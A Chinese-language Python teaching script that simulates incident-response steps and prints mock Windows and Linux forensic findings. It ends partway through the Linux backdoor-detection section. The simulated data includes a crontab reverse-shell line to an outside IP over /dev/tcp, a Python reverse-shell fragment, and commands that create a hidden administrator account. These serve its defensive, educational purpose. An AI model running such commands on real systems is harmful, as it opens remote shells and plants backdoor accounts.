#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  应急响应实战案例 - 网络安全学习资料
================================================================================

  安全声明：
  ========
  本文件仅用于授权安全测试、安全教育目的和防御技术研究。
  所有代码均为模拟实现，不包含真实的攻击工具或恶意代码。
  请在合法授权范围内使用，遵守当地法律法规。
  未授权使用这些技术可能违反《网络安全法》《数据安全法》等法律法规。

  文件内容：
  ========
  1. 应急响应流程模拟（IR流程：接报→遏制→根除→恢复→总结）
  2. Windows应急响应（进程分析、持久化检查、日志分析、注册表取证）
  3. Linux应急响应（后门检测、crontab检查、SSH密钥审计、rootkit检测）
  4. 勒索软件应急响应（加密行为检测、传播遏制、恢复方案）
  5. 威胁情报处理（STIX/TAXII数据解析、IOC提取与匹配、威胁情报报告）
  6. 数字取证工具（磁盘镜像校验、内存取证分析、时间线构建）
  7. 攻击溯源分析（攻击路径还原、TTP映射MITRE ATT&CK、归因分析）

  技术参考：
  =========
  - NIST SP 800-61 计算机安全事件处理指南
  - SANS 应急响应流程
  - MITRE ATT&CK 框架
  - STIX 2.1 / TAXII 2.1 规范
  - ISO/IEC 27037 电子证据收集与保护

================================================================================
"""

import os
import sys
import json
import hashlib
import time
import random
import re
import datetime
from collections import defaultdict, OrderedDict


# =============================================================================
# 第一部分：应急响应流程模拟
# =============================================================================

class 应急响应流程模拟器:
    """
    模拟完整的应急响应（IR）流程，参考 NIST SP 800-61 标准。
    
    IR流程包含五个阶段：
    1. 接报与准备 - 接收安全事件报告，启动应急响应
    2. 检测与分析 - 确认事件性质和影响范围
    3. 遏制与隔离 - 阻止事件扩散
    4. 根除与恢复 - 清除威胁，恢复系统
    5. 总结与改进 - 事后总结，改进安全措施
    """

    def __init__(self):
        self.事件编号 = "IR-2026-0911-001"
        self.事件状态 = "新建"
        self.事件级别 = None
        self.响应团队 = []
        self.时间线 = []
        self.处理步骤 = []
        self.受影响系统 = []

    def 接报与准备(self, 事件描述, 报告人):
        """阶段一：接报与准备"""
        print("=" * 70)
        print("  [阶段一] 接报与准备")
        print("=" * 70)

        接报时间 = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.时间线.append(("接报", 接报时间, 事件描述))

        print(f"  事件编号: {self.事件编号}")
        print(f"  接报时间: {接报时间}")
        print(f"  报 告 人: {报告人}")
        print(f"  事件描述: {事件描述}")
        print()

        # 事件分级评估
        关键词高危 = ["勒索", "数据泄露", "横向移动", "域控", "root", "提权"]
        关键词中危 = ["webshell", "异常", "后门", "病毒", "木马"]

        级别 = "低"
        for kw in 关键词高危:
            if kw in 事件描述.lower():
                级别 = "高"
                break
        if 级别 != "高":
            for kw in 关键词中危:
                if kw in 事件描述.lower():
                    级别 = "中"
                    break

        self.事件级别 = 级别
        print(f"  >> 事件分级评估: {级别}危")
        print(f"     分级依据: 基于事件描述关键词分析")

        # 组建响应团队
        团队配置 = {
            "高": ["事件指挥官", "安全分析师", "系统管理员", "网络工程师", "法务顾问", "公关联络"],
            "中": ["事件指挥官", "安全分析师", "系统管理员"],
            "低": ["安全分析师"],
        }
        self.响应团队 = 团队配置.get(级别, ["安全分析师"])
        print(f"\n  >> 响应团队组建:")
        for 成员 in self.响应团队:
            print(f"     - {成员}")

        # 启动响应
        self.事件状态 = "调查中"
        print(f"\n  >> 事件状态: {self.事件状态}")
        self.处理步骤.append("接报与准备: 完成")
        print("-" * 70)

    def 检测与分析(self, 告警信息):
        """阶段二：检测与分析"""
        print("\n  [阶段二] 检测与分析")
        print("-" * 70)

        分析时间 = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.时间线.append(("分析", 分析时间, "开始事件分析"))

        print(f"  分析时间: {分析时间}")
        print(f"  告警来源: {告警信息.get('来源', 'IDS/IPS')}")
        print(f"  告警类型: {告警信息.get('类型', '未知')}")
        print(f"  告警等级: {告警信息.get('等级', '中')}")
        print()

        # 影响范围评估
        受影响资产 = 告警信息.get("受影响资产", [])
        self.受影响系统 = 受影响资产
        print("  >> 影响范围评估:")
        for 资产 in 受影响资产:
            状态 = random.choice(["确认受影响", "疑似受影响", "需进一步检查"])
            print(f"     - {资产}: {状态}")

        # 攻击向量分析
        攻击向量 = 告警信息.get("攻击向量", "钓鱼邮件")
        print(f"\n  >> 攻击向量分析: {攻击向量}")
        print(f"     初始入侵方式: {攻击向量}")

        # IOC初步提取
        print(f"\n  >> IOC初步提取:")
        示例IOC = {
            "IP地址": ["192.168.1.100", "10.0.0.55", "45.155.205.99"],
            "域名": ["malware-c2.evil.com", "update-fake.net"],
            "文件哈希": ["a3f5b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a"],
            "文件名": ["svchost_helper.exe", "powershell_enc.ps1"],
        }
        for ioc类型, ioc值列表 in 示例IOC.items():
            print(f"     {ioc类型}:")
            for 值 in ioc值列表:
                print(f"       - {值}")

        self.事件状态 = "已确认"
        self.处理步骤.append("检测与分析: 完成")
        print(f"\n  >> 事件状态: {self.事件状态}")
        print("-" * 70)

    def 遏制与隔离(self, 隔离策略):
        """阶段三：遏制与隔离"""
        print("\n  [阶段三] 遏制与隔离")
        print("-" * 70)

        遏制时间 = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.时间线.append(("遏制", 遏制时间, "执行遏制措施"))

        print(f"  遏制时间: {遏制时间}")
        print(f"  遏制策略: {隔离策略}")
        print()

        # 遏制措施执行
        措施列表 = [
            ("网络隔离", "将受感染主机从网络中断开", "已执行"),
            ("账户冻结", "冻结相关可疑账户", "已执行"),
            ("防火墙规则", "添加阻断规则屏蔽C2通信", "已执行"),
            ("邮件网关", "更新规则拦截钓鱼邮件", "已执行"),
            ("VPN会话", "终止异常VPN连接", "已执行"),
        ]

        print("  >> 遏制措施执行清单:")
        for 措施, 描述, 状态 in 措施列表:
            print(f"     [{状态}] {措施}: {描述}")

        # 验证遏制效果
        print(f"\n  >> 遏制效果验证:")
        验证结果 = [
            ("C2通信检测", "阻断成功", "通过"),
            ("横向移动检测", "未发现新传播", "通过"),
            ("数据外传检测", "流量已阻断", "通过"),
            ("持久化机制", "已识别待清除", "需跟进"),
        ]
        for 检测项, 结果, 状态 in 验证结果:
            print(f"     {检测项}: {结果} [{状态}]")

        self.事件状态 = "已遏制"
        self.处理步骤.append("遏制与隔离: 完成")
        print(f"\n  >> 事件状态: {self.事件状态}")
        print("-" * 70)

    def 根除与恢复(self, 根除计划):
        """阶段四：根除与恢复"""
        print("\n  [阶段四] 根除与恢复")
        print("-" * 70)

        处理时间 = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.时间线.append(("根除", 处理时间, "执行根除和恢复"))

        print(f"  处理时间: {处理时间}")
        print(f"  根除计划: {根除计划}")
        print()

        # 根除步骤
        根除步骤 = [
            ("清除恶意文件", "删除webshell、木马及后门程序", "完成"),
            ("清除持久化", "删除注册表自启项、计划任务、服务项", "完成"),
            ("清除恶意账户", "删除攻击者创建的后门账户", "完成"),
            ("修补漏洞", "安装安全补丁，修复入侵路径", "完成"),
            ("密码重置", "重置所有可能泄露的账户密码", "完成"),
            ("配置加固", "强化系统配置，关闭不必要服务", "完成"),
        ]

        print("  >> 根除步骤:")
        for 步骤, 描述, 状态 in 根除步骤:
            print(f"     [{状态}] {步骤}: {描述}")

        # 恢复步骤
        print(f"\n  >> 恢复步骤:")
        恢复步骤 = [
            ("系统恢复", "从可信备份恢复受影响系统", "进行中"),
            ("服务恢复", "逐步恢复业务服务", "待执行"),
            ("完整性验证", "验证系统完整性和数据一致性", "待执行"),
            ("监控加强", "部署增强监控和告警规则", "待执行"),
        ]
        for 步骤, 描述, 状态 in 恢复步骤:
            print(f"     [{状态}] {步骤}: {描述}")

        self.事件状态 = "恢复中"
        self.处理步骤.append("根除与恢复: 进行中")
        print(f"\n  >> 事件状态: {self.事件状态}")
        print("-" * 70)

    def 总结与改进(self):
        """阶段五：总结与改进"""
        print("\n  [阶段五] 总结与改进")
        print("-" * 70)

        总结时间 = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.时间线.append(("总结", 总结时间, "事件总结与复盘"))

        print(f"  总结时间: {总结时间}")
        print(f"  事件编号: {self.事件编号}")
        print(f"  事件级别: {self.事件级别}危")
        print()

        # 事件总结报告
        print("  >> 事件总结报告:")
        报告内容 = {
            "事件概述": "检测到通过钓鱼邮件传播的恶意软件，攻击者尝试横向移动",
            "影响范围": f"共影响 {len(self.受影响系统)} 个系统",
            "根因分析": "用户点击钓鱼邮件附件，触发恶意宏代码执行",
            "处置过程": "识别→隔离→清除→恢复，全流程约4小时",
            "数据影响": "未发生数据泄露，及时遏制成功",
        }
        for 标题, 内容 in 报告内容.items():
            print(f"     {标题}: {内容}")

        # 改进措施
        print(f"\n  >> 安全改进措施:")
        改进措施 = [
            "加强邮件安全网关的附件检测能力",
            "部署EDR终端检测响应系统",
            "开展全员钓鱼邮件防范培训",
            "完善应急响应预案和演练机制",
            "增加网络分段，减少横向移动风险",
            "建立威胁情报订阅和IOC自动阻断机制",
        ]
        for i, 措施 in enumerate(改进措施, 1):
            print(f"     {i}. {措施}")

        self.事件状态 = "已关闭"
        self.处理步骤.append("总结与改进: 完成")
        print(f"\n  >> 事件状态: {self.事件状态}")

        # 输出完整时间线
        print(f"\n  >> 事件响应完整时间线:")
        for 阶段, 时间, 描述 in self.时间线:
            print(f"     [{时间}] {阶段}: {描述}")

        print("=" * 70)


# =============================================================================
# 第二部分：Windows应急响应
# =============================================================================

class Windows应急响应工具:
    """
    Windows系统应急响应工具模拟。
    
    包含：
    - 进程分析：识别恶意进程、可疑父子进程关系
    - 持久化检查：注册表自启、服务、计划任务、WMI
    - 日志分析：安全日志、系统日志、应用日志
    - 注册表取证：提取关键注册表证据
    """

    # 模拟的Windows进程列表
    模拟进程列表 = [
        {"PID": 4, "名称": "System", "父PID": 0, "路径": "ntoskrnl.exe", "签名": "Microsoft", "网络": False},
        {"PID": 612, "名称": "lsass.exe", "父PID": 504, "路径": "C:\\Windows\\System32\\lsass.exe", "签名": "Microsoft", "网络": True},
        {"PID": 856, "名称": "svchost.exe", "父PID": 612, "路径": "C:\\Windows\\System32\\svchost.exe", "签名": "Microsoft", "网络": True},
        {"PID": 1024, "名称": "explorer.exe", "父PID": 980, "路径": "C:\\Windows\\explorer.exe", "签名": "Microsoft", "网络": False},
        {"PID": 2048, "名称": "svchost_helper.exe", "父PID": 856, "路径": "C:\\Users\\Public\\svchost_helper.exe", "签名": "未签名", "网络": True},
        {"PID": 3072, "名称": "powershell.exe", "父PID": 2048, "路径": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "签名": "Microsoft", "网络": True},
        {"PID": 4096, "名称": "mimikatz.exe", "父PID": 3072, "路径": "C:\\Temp\\mimikatz.exe", "签名": "未签名", "网络": False},
        {"PID": 5120, "名称": "cmd.exe", "父PID": 2048, "路径": "C:\\Windows\\System32\\cmd.exe", "签名": "Microsoft", "网络": False},
    ]

    # 模拟的网络连接
    模拟网络连接 = [
        {"本地地址": "0.0.0.0:135", "远程地址": "*:*", "状态": "LISTENING", "PID": 856, "协议": "TCP"},
        {"本地地址": "192.168.1.50:49200", "远程地址": "45.155.205.99:443", "状态": "ESTABLISHED", "PID": 2048, "协议": "TCP"},
        {"本地地址": "192.168.1.50:49201", "远程地址": "45.155.205.99:8443", "状态": "ESTABLISHED", "PID": 2048, "协议": "TCP"},
        {"本地地址": "0.0.0.0:445", "远程地址": "*:*", "状态": "LISTENING", "PID": 4, "协议": "TCP"},
        {"本地地址": "192.168.1.50:49215", "远程地址": "10.0.0.55:3389", "状态": "ESTABLISHED", "PID": 5120, "协议": "TCP"},
    ]

    # 模拟的注册表自启项
    模拟注册表自启 = [
        {"路径": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "名称": "SecurityHealth", "值": "C:\\Windows\\System32\\SecurityHealthSystray.exe", "风险": "低"},
        {"路径": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "名称": "WindowsUpdate", "值": "C:\\Users\\Public\\svchost_helper.exe", "风险": "高"},
        {"路径": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "名称": "UpdateService", "值": "powershell -enc SQBFAFgA...", "风险": "高"},
        {"路径": "HKLM\\SYSTEM\\CurrentControlSet\\Services", "名称": "WinDefenderUpdate", "值": "C:\\Temp\\wd_update.exe", "风险": "高"},
    ]

    # 模拟的计划任务
    模拟计划任务 = [
        {"任务名": "GoogleUpdateTask", "状态": "就绪", "触发器": "登录时", "动作": "C:\\Program Files\\Google\\Update\\GoogleUpdate.exe", "风险": "低"},
        {"任务名": "SystemUpdate", "状态": "运行中", "触发器": "每30分钟", "动作": "C:\\Users\\Public\\svchost_helper.exe -silent", "风险": "高"},
        {"任务名": "CacheCleaner", "状态": "就绪", "触发器": "每天03:00", "动作": "powershell -File C:\\Temp\\clean.ps1", "风险": "中"},
    ]

    def __init__(self):
        self.可疑进程 = []
        self.可疑连接 = []
        self.可疑持久化 = []
        self.发现的问题 = []

    def 进程分析(self):
        """分析系统进程，识别可疑进程"""
        print("\n" + "=" * 70)
        print("  Windows进程分析")
        print("=" * 70)

        print("\n  [1] 当前运行进程列表:")
        print(f"  {'PID':<8} {'进程名':<25} {'父PID':<8} {'签名状态':<12} {'路径'}")
        print(f"  {'-'*8} {'-'*25} {'-'*8} {'-'*12} {'-'*40}")
        for proc in self.模拟进程列表:
            print(f"  {proc['PID']:<8} {proc['名称']:<25} {proc['父PID']:<8} {proc['签名']:<12} {proc['路径']}")

        # 可疑进程识别规则
        print("\n  [2] 可疑进程识别:")
        检测规则 = [
            "规则1: 进程路径不在系统目录 (如不在System32)",
            "规则2: 进程签名状态为'未签名'",
            "规则3: 进程名伪装系统进程 (如svchost_helper.exe)",
            "规则4: 异常父子进程关系 (如powershell由非系统进程启动)",
            "规则5: 进程路径在临时目录 (如C:\\Temp, C:\\Users\\Public)",
        ]
        for 规则 in 检测规则:
            print(f"    {规则}")

        # 执行检测
        print("\n  [3] 检测结果:")
        for proc in self.模拟进程列表:
            风险标记 = []
            if proc["签名"] == "未签名":
                风险标记.append("未签名")
            if "Temp" in proc["路径"] or "Users\\Public" in proc["路径"]:
                风险标记.append("异常路径")
            if "helper" in proc["名称"].lower() or "mimikatz" in proc["名称"].lower():
                风险标记.append("名称可疑")

            if 风险标记:
                self.可疑进程.append(proc)
                print(f"    [!] PID {proc['PID']} {proc['名称']} - 风险: {', '.join(风险标记)}")
                print(f"        路径: {proc['路径']}")
                print(f"        父进程: PID {proc['父PID']}")

        # 父子进程关系分析
        print("\n  [4] 父子进程关系分析:")
        print("    异常进程链:")
        print("    svchost.exe(PID:856)")
        print("      └── svchost_helper.exe(PID:2048) [!] 可疑子进程")
        print("            ├── powershell.exe(PID:3072) [!] 被可疑进程调用")
        print("            │     └── mimikatz.exe(PID:4096) [!] 凭据窃取工具")
        print("            └── cmd.exe(PID:5120) [!] 被可疑进程调用")

        if self.可疑进程:
            self.发现的问题.append(f"发现 {len(self.可疑进程)} 个可疑进程")
        print(f"\n  >> 总结: 发现 {len(self.可疑进程)} 个可疑进程需要进一步调查")

    def 网络连接分析(self):
        """分析网络连接，识别C2通信"""
        print("\n" + "=" * 70)
        print("  Windows网络连接分析")
        print("=" * 70)

        print(f"\n  {'协议':<6} {'本地地址':<25} {'远程地址':<25} {'状态':<15} {'PID':<8}")
        print(f"  {'-'*6} {'-'*25} {'-'*25} {'-'*15} {'-'*8}")
        for conn in self.模拟网络连接:
            print(f"  {conn['协议']:<6} {conn['本地地址']:<25} {conn['远程地址']:<25} {conn['状态']:<15} {conn['PID']:<8}")

        # 可疑连接检测
        print("\n  >> 可疑网络连接:")
        可疑IP = ["45.155.205.99"]
        内网横向IP = ["10.0.0.55"]

        for conn in self.模拟网络连接:
            远程IP = conn["远程地址"].split(":")[0]
            if 远程IP in 可疑IP:
                self.可疑连接.append(conn)
                print(f"    [!] C2通信: {conn['本地地址']} -> {conn['远程地址']} (PID: {conn['PID']})")
                print(f"        远程IP {远程IP} 已标记为恶意C2服务器")
            elif 远程IP in 内网横向IP:
                print(f"    [!] 横向移动: {conn['本地地址']} -> {conn['远程地址']} (PID: {conn['PID']})")
                print(f"        检测到RDP连接到内网其他主机")

        # 已知恶意IP情报
        print("\n  >> 威胁情报匹配:")
        情报库 = {
            "45.155.205.99": {"标签": "CobaltStrike C2", "来源": "威胁情报平台", "首次发现": "2026-08-15"},
            "10.0.0.55": {"标签": "内网资产", "来源": "CMDB", "首次发现": "N/A"},
        }
        for ip, 情报 in 情报库.items():
            print(f"    {ip}: {情报['标签']} (来源: {情报['来源']})")

    def 持久化检查(self):
        """检查系统持久化机制"""
        print("\n" + "=" * 70)
        print("  Windows持久化机制检查")
        print("=" * 70)

        # 注册表自启项检查
        print("\n  [1] 注册表自启动项检查:")
        print(f"  {'风险':<6} {'注册表路径':<70} {'名称'}")
        print(f"  {'-'*6} {'-'*70} {'-'*20}")
        for item in self.模拟注册表自启:
            print(f"  {item['风险']:<6} {item['路径']:<70} {item['名称']}")
            if item["风险"] == "高":
                self.可疑持久化.append(item)
                print(f"         值: {item['值']}")

        # 计划任务检查
        print("\n  [2] 计划任务检查:")
        print(f"  {'风险':<6} {'任务名':<25} {'状态':<10} {'触发器':<15} {'动作'}")
        print(f"  {'-'*6} {'-'*25} {'-'*10} {'-'*15} {'-'*40}")
        for task in self.模拟计划任务:
            print(f"  {task['风险']:<6} {task['任务名']:<25} {task['状态']:<10} {task['触发器']:<15} {task['动作']}")
            if task["风险"] == "高":
                self.可疑持久化.append(task)

        # 服务检查
        print("\n  [3] 系统服务检查:")
        模拟服务 = [
            {"服务名": "WinDefenderUpdate", "路径": "C:\\Temp\\wd_update.exe", "状态": "运行中", "风险": "高"},
            {"服务名": "WindowsUpdate", "路径": "C:\\Windows\\System32\\wuauserv.dll", "状态": "运行中", "风险": "低"},
        ]
        print(f"  {'风险':<6} {'服务名':<30} {'状态':<10} {'路径'}")
        print(f"  {'-'*6} {'-'*30} {'-'*10} {'-'*40}")
        for svc in 模拟服务:
            print(f"  {svc['风险']:<6} {svc['服务名']:<30} {svc['状态']:<10} {svc['路径']}")
            if svc["风险"] == "高":
                self.可疑持久化.append(svc)

        # WMI持久化检查
        print("\n  [4] WMI事件订阅检查:")
        模拟WMI = [
            {"名称": "EventConsumerAutoUpdate", "类型": "ActiveScriptEventConsumer", "脚本": "powershell -enc ...", "风险": "高"},
        ]
        for wmi in 模拟WMI:
            print(f"    [!] {wmi['名称']} ({wmi['类型']})")
            print(f"        脚本: {wmi['脚本']}")
            print(f"        风险: {wmi['风险']}")
            self.可疑持久化.append(wmi)

        print(f"\n  >> 总结: 发现 {len(self.可疑持久化)} 个可疑持久化项")

    def 日志分析(self):
        """分析Windows事件日志"""
        print("\n" + "=" * 70)
        print("  Windows事件日志分析")
        print("=" * 70)

        # 安全日志分析
        print("\n  [1] 安全日志分析 - 关键事件ID:")
        关键事件 = [
            {"事件ID": 4624, "描述": "成功登录", "次数": 1523, "关注": False},
            {"事件ID": 4625, "描述": "登录失败", "次数": 347, "关注": True},
            {"事件ID": 4672, "描述": "特殊权限分配", "次数": 12, "关注": True},
            {"事件ID": 4688, "描述": "进程创建", "次数": 8920, "关注": True},
            {"事件ID": 4720, "描述": "用户账户创建", "次数": 3, "关注": True},
            {"事件ID": 4732, "描述": "成员添加到安全组", "次数": 5, "关注": True},
        ]
        print(f"  {'事件ID':<10} {'描述':<25} {'出现次数':<10} {'需关注'}")
        print(f"  {'-'*10} {'-'*25} {'-'*10} {'-'*8}")
        for evt in 关键事件:
            关注标记 = " [!]" if evt["关注"] else ""
            print(f"  {evt['事件ID']:<10} {evt['描述']:<25} {evt['次数']:<10} {'是' if evt['关注'] else '否'}{关注标记}")

        # 登录失败分析
        print("\n  [2] 登录失败事件分析 (Event ID: 4625):")
        登录失败记录 = [
            {"时间": "2026-09-11 02:15:33", "用户": "admin", "来源IP": "45.155.205.99", "类型": "密码暴力破解"},
            {"时间": "2026-09-11 02:15:34", "用户": "admin", "来源IP": "45.155.205.99", "类型": "密码暴力破解"},
            {"时间": "2026-09-11 02:15:35", "用户": "Administrator", "来源IP": "45.155.205.99", "类型": "密码暴力破解"},
            {"时间": "2026-09-11 03:22:10", "用户": "svc_backup", "来源IP": "45.155.205.99", "类型": "密码喷洒攻击"},
        ]
        print(f"  {'时间':<22} {'用户':<20} {'来源IP':<20} {'攻击类型'}")
        print(f"  {'-'*22} {'-'*20} {'-'*20} {'-'*20}")
        for rec in 登录失败记录:
            print(f"  {rec['时间']:<22} {rec['用户']:<20} {rec['来源IP']:<20} {rec['类型']}")

        # 新账户创建
        print("\n  [3] 可疑账户创建 (Event ID: 4720):")
        新账户 = [
            {"时间": "2026-09-11 03:45:12", "账户": "svc_update", "创建者": "admin", "描述": "伪装更新服务账户"},
            {"时间": "2026-09-11 03:46:20", "账户": "backup_agent", "创建者": "admin", "描述": "伪装备份代理"},
        ]
        for acc in 新账户:
            print(f"    [!] {acc['时间']} 账户 '{acc['账户']}' 被创建 (创建者: {acc['创建者']})")
            print(f"        描述: {acc['描述']}")

        # 特殊权限使用
        print("\n  [4] 特殊权限使用 (Event ID: 4672):")
        特权记录 = [
            {"时间": "2026-09-11 03:50:00", "用户": "svc_update", "权限": "SeDebugPrivilege", "描述": "调试权限，可能用于注入"},
        ]
        for rec in 特权记录:
            print(f"    [!] {rec['时间']} 用户 '{rec['用户']}' 获得权限: {rec['权限']}")
            print(f"        分析: {rec['描述']}")

    def 注册表取证(self):
        """注册表取证分析"""
        print("\n" + "=" * 70)
        print("  Windows注册表取证分析")
        print("=" * 70)

        # 取证关键注册表位置
        取证位置 = [
            {
                "位置": "HKLM\\SAM\\SAM\\Domains\\Account\\Users",
                "描述": "SAM数据库 - 用户账户哈希",
                "发现": "发现隐藏账户 (RID: 1001)",
                "风险": "高",
            },
            {
                "位置": "HKLM\\SECURITY\\Policy\\Secrets",
                "描述": "LSA Secrets - 存储的凭据",
                "发现": "发现DPAPI主密钥和缓存的凭据",
                "风险": "高",
            },
            {
                "位置": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager",
                "描述": "会话管理器 - 启动项",
                "发现": "BootExecute值异常",
                "风险": "中",
            },
            {
                "位置": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                "描述": "Winlogon - 用户登录相关",
                "发现": "Userinit值被修改，附加恶意程序",
                "风险": "高",
            },
            {
                "位置": "HKLM\\SYSTEM\\CurrentControlSet\\Services",
                "描述": "系统服务 - 服务配置",
                "发现": "发现伪装服务的恶意服务项",
                "风险": "高",
            },
        ]

        for item in 取证位置:
            print(f"\n  [!] 检查: {item['位置']}")
            print(f"      描述: {item['描述']}")
            print(f"      发现: {item['发现']}")
            print(f"      风险: {item['风险']}")

        # USB设备使用历史
        print("\n  >> USB设备使用历史取证:")
        USB历史 = [
            {"设备名": "USB Mass Storage Device", "序列号": "AABB1234", "首次插入": "2026-09-10 14:30", "最后移除": "2026-09-10 14:45"},
            {"设备名": "USB Mass Storage Device", "序列号": "XXYY5678", "首次插入": "2026-09-11 01:15", "最后移除": "2026-09-11 01:20"},
        ]
        for usb in USB历史:
            print(f"    设备: {usb['设备名']} (S/N: {usb['序列号']})")
            print(f"    插入: {usb['首次插入']} | 移除: {usb['最后移除']}")

        # 用户最近活动
        print("\n  >> 用户最近活动记录:")
        活动记录 = [
            {"类型": "最近文档", "内容": "财务报表_2026Q3.xlsx", "时间": "2026-09-10 16:00"},
            {"类型": "运行命令", "内容": "net user svc_update P@ss123 /add", "时间": "2026-09-11 03:45"},
            {"类型": "运行命令", "内容": "net localgroup administrators svc_update /add", "时间": "2026-09-11 03:46"},
            {"类型": "运行命令", "内容": "reg add HKLM\\...\\Run /v Update /t REG_SZ /d C:\\Users\\Public\\svchost_helper.exe", "时间": "2026-09-11 03:47"},
        ]
        for rec in 活动记录:
            print(f"    [{rec['时间']}] {rec['类型']}: {rec['内容']}")

    def 生成报告(self):
        """生成Windows应急响应报告"""
        print("\n" + "=" * 70)
        print("  Windows应急响应报告汇总")
        print("=" * 70)
        print(f"\n  可疑进程数: {len(self.可疑进程)}")
        print(f"  可疑连接数: {len(self.可疑连接)}")
        print(f"  可疑持久化项: {len(self.可疑持久化)}")
        print(f"\n  发现的问题汇总:")
        for i, 问题 in enumerate(self.发现的问题, 1):
            print(f"    {i}. {问题}")
        print(f"\n  处置建议:")
        建议 = [
            "立即终止可疑进程 (PID: 2048, 3072, 4096)",
            "阻断C2通信IP: 45.155.205.99",
            "清除所有可疑持久化项",
            "删除恶意账户: svc_update, backup_agent",
            "重置所有管理员密码",
            "从可信备份恢复系统",
        ]
        for i, s in enumerate(建议, 1):
            print(f"    {i}. {s}")


# =============================================================================
# 第三部分：Linux应急响应
# =============================================================================

class Linux应急响应工具:
    """
    Linux系统应急响应工具模拟。
    
    包含：
    - 后门检测：反弹shell、rootkit、隐藏进程
    - crontab检查：计划任务后门
    - SSH密钥审计：未授权密钥、异常登录
    - rootkit检测：内核模块、系统二进制文件完整性
    """

    # 模拟的进程列表
    模拟进程 = [
        {"PID": 1, "用户": "root", "命令": "/sbin/init", "CPU": 0.0, "内存": 0.1, "启动": "Sep10"},
        {"PID": 1234, "用户": "www", "命令": "nginx: worker process", "CPU": 0.5, "内存": 2.3, "启动": "Sep10"},
        {"PID": 2345, "用户": "root", "命令": "/usr/sbin/sshd -D", "CPU": 0.0, "内存": 0.5, "启动": "Sep10"},
        {"PID": 3456, "用户": "nobody", "命令": "/tmp/.systemd-update --daemon", "CPU": 15.2, "内存": 8.5, "启动": "Sep11"},
        {"PID": 4567, "用户": "root", "命令": "python -c import socket,subprocess,os;s=socket.socket()", "CPU": 2.1, "内存": 3.2, "启动": "Sep11"},
        {"PID": 5678, "用户": "mysql", "命令": "/usr/sbin/mysqld --datadir=/var/lib/mysql", "CPU": 1.2, "内存": 12.5, "启动": "Sep10"},
    ]

    # 模拟的crontab
    模拟crontab = [
        {"用户": "root", "计划": "*/30 * * * *", "命令": "/usr/bin/updatedb", "风险": "低"},
        {"用户": "root", "计划": "*/5 * * * *", "命令": "/tmp/.systemd-update --check", "风险": "高"},
        {"用户": "www", "计划": "0 3 * * *", "命令": "/usr/local/bin/backup.sh", "风险": "低"},
        {"用户": "root", "计划": "@reboot", "命令": "/bin/bash -c 'bash -i >& /dev/tcp/45.155.205.99/4444 0>&1'", "风险": "高"},
    ]

    # 模拟SSH authorized_keys
    模拟SSH密钥 = [
        {"用户": "root", "密钥类型": "ssh-rsa", "指纹": "SHA256:AbCdEf123456", "注释": "admin@workstation", "最后登录": "2026-09-10", "风险": "低"},
        {"用户": "root", "密钥类型": "ssh-rsa", "指纹": "SHA256:XxYyZz789012", "注释": "backdoor@unknown", "最后登录": "2026-09-11 01:00", "风险": "高"},
        {"用户": "admin", "密钥类型": "ssh-ed25519", "指纹": "SHA256:PpQqRr345678", "注释": "dev@build-server", "最后登录": "2026-09-09", "风险": "低"},
    ]

    # 模拟的登录记录
    模拟登录记录 = [
        {"时间": "Sep 10 09:15:23", "用户": "root", "来源IP": "192.168.1.100", "方式": "password", "状态": "成功"},
        {"时间": "Sep 11 01:00:45", "用户": "root", "来源IP": "45.155.205.99", "方式": "publickey", "状态": "成功"},
        {"时间": "Sep 11 01:15:30", "用户": "admin", "来源IP": "45.155.205.99", "方式": "password", "状态": "失败"},
        {"时间": "Sep 11 01:15:35", "用户": "admin", "来源IP": "45.155.205.99", "方式": "password", "状态": "成功"},
        {"时间": "Sep 11 02:30:00", "用户": "root", "来源IP": "45.155.205.99", "方式": "publickey", "状态": "成功"},
    ]

    def __init__(self):
        self.可疑进程 = []
        self.可疑计划任务 = []
        self.可疑密钥 = []
        self.可疑登录 = []

    def 后门检测(self):
        """检测系统后门"""
        print("\n" + "=" * 70)
        print("  Linux后门检测")
        print("=" * 70)

        # 进程分析
        print("\n  [1] 可疑进程检测:")
        print(f"  {'PID':<8} {'用户':<10} {'CPU%':<8} {'内存%':<8} {'命令'}")
        print(f"  {'-'*8} {'-'*10} {'-'*8} {'-'*8} {'-'*50}")
        for proc in self.模拟进程:
            print(f"  {proc['PID']:<8} {proc['用户']:<10} {proc['CPU']:<8} {proc['内存']:<8} {proc['命令'][:50]}")

        # 检测规则
        print("\n  >> 后门检测规则:")
        print("    规则1: 进程在/tmp目录运行")
        print("    规则2: 进程名伪装系统服务 (如.systemd-update)")
        print("    规则3: python/bash执行socket网络连接 (反弹Shell)")
        print("    规则4: 以root权限运行的异常进程")

        # 检测结果
        print("\n  >> 检测结果:")
        for proc in self.模拟进程:
            风险 = []
            if "/tmp/" in proc["命令"]:
                风险.append("临时目录执行")
            if ".systemd" in proc["命令"]:
                风险.append("伪装系统服务")
            if "socket" in proc["命令"] and "subprocess" in proc["命令"]:
                风险.append("反弹Shell")
            if 风险:
                self.可疑进程.append(proc)
                print(f"    [!] PID {proc['PID']} ({proc['用户']}): {', '.join(风险)}")
                print(f"        命令: {proc['命令'][:70]}")

        # 网络后门检测
        print("\n  [2] 网络后门检测:")
        模拟监听 = [
            {"端口": 22, "地址": "0.0.0.0:22", "进程": "sshd", "状态": "正常"},
            {"端口": 80, "地址": "0.0.0.0:80", "进程": "nginx", "状态": "正常"},
            {"端口": 4444, "地址": "0.0.0.0:4444", "进程": "python", "状态": "可疑"},
            {"端口": 1337, "地址": "127.0.0.1:1337", "进程": ".systemd-update", "状态": "可疑"},
        ]
        print(f"  {'端口':<8} {'监听地址':<20} {'进程':<20} {'状态'}")
